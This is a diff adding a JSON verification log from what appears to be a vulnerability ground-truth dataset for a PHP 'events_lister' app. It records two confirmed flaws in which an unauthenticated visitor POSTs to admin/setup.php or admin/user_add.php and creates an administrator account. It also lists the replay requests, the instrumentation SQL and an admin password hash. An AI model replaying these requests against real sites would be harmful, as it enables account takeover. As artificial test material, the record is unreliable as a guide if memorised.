@@ -1,0 +1,104 @@
+{
+  "app": "events_lister",
+  "baseline": "D:\\project\\python\\DRHL\\ground_truth\\verification\\evidence\\events_lister\\baseline.sql",
+  "database_restored_after_each_record": true,
+  "restore_verified_per_record": [
+    true,
+    true
+  ],
+  "final_database_matches_baseline": true,
+  "results": [
+    {
+      "gt_id": "GT-027",
+      "app": "events_lister",
+      "verified_at": "2026-09-06T04:58:05.161406+00:00",
+      "verdict": "vulnerable",
+      "summary": "visitor POST admin/setup.php returned 200; visitor recreated the administrator account id=1 with attacker-chosen email (created=True) and the setup inserted a Test Event row (events 21->22); baseline restored afterwards.",
+      "sql_statements": [
+        {
+          "kind": "query",
+          "sql": "SELECT id, uname, pword FROM admin WHERE id=1"
+        },
+        {
+          "kind": "scalar",
+          "sql": "SELECT COUNT(*) FROM events"
+        },
+        {
+          "kind": "execute",
+          "sql": "DELETE FROM admin WHERE id=1"
+        },
+        {
+          "kind": "scalar",
+          "sql": "SELECT uname FROM admin WHERE id=1"
+        },
+        {
+          "kind": "scalar",
+          "sql": "SELECT COUNT(*) FROM events"
+        },
+        {
+          "kind": "scalar",
+          "sql": "SELECT COUNT(*) FROM events WHERE event='Test Event'"
+        }
+      ],
+      "steps": [
+        {
+          "kind": "instrument",
+          "table": "admin",
+          "cleared_row": [
+            [
+              "1",
+              "admin@qq.com",
+              "ed057c7f79e1f896f641242d834ed2b1"
+            ]
+          ],
+          "events_before": "21",
+          "note": "admin id=1 cleared to simulate fresh-install precondition"
+        },
+        {
+          "kind": "replay",
+          "role": "visitor (no login)",
+          "request": "POST admin/setup.php uname=<token>@example.test test_event=yes",
+          "status_code": 200,
+          "success_message_in_response": true,
+          "admin_id1_uname_after": "DRHLGT_setupadmin_8670684636@example.test",
+          "admin_account_created_by_visitor": true,
+          "events_before": "21",
+          "events_after": "22",
+          "test_event_rows": "2",
+          "body_saved": "GT-027_gt027_visitor_setup.html"
+        }
+      ],
+      "restore_verified": true
+    },
+    {
+      "gt_id": "GT-028",
+      "app": "events_lister",
+      "verified_at": "2026-09-06T04:58:05.565300+00:00",
+      "verdict": "vulnerable",
+      "summary": "visitor POST admin/user_add.php returned 200; a new administrator account row (id=4, uname=DRHLGT_addadmin_8670685443@example.test) was created without any login (created=True).",
+      "sql_statements": [
+        {
+          "kind": "scalar",
+          "sql": "SELECT id FROM admin WHERE uname='DRHLGT_addadmin_8670685443@example.test' LIMIT 1"
+        }
+      ],
+      "steps": [
+        {
+          "kind": "instrument",
+          "table": "admin",
+          "token_email": "DRHLGT_addadmin_8670685443@example.test"
+        },
+        {
+          "kind": "replay",
+          "role": "visitor (no login)",
+          "request": "POST admin/user_add.php uname=<token>@example.test",
+          "status_code": 200,
+          "admin_row_created_id": "4",
+          "created": true,
+          "body_saved": "GT-028_gt028_visitor_user_add.html"
+        }
+      ],
+      "restore_verified": true
+    }
+  ]
+}
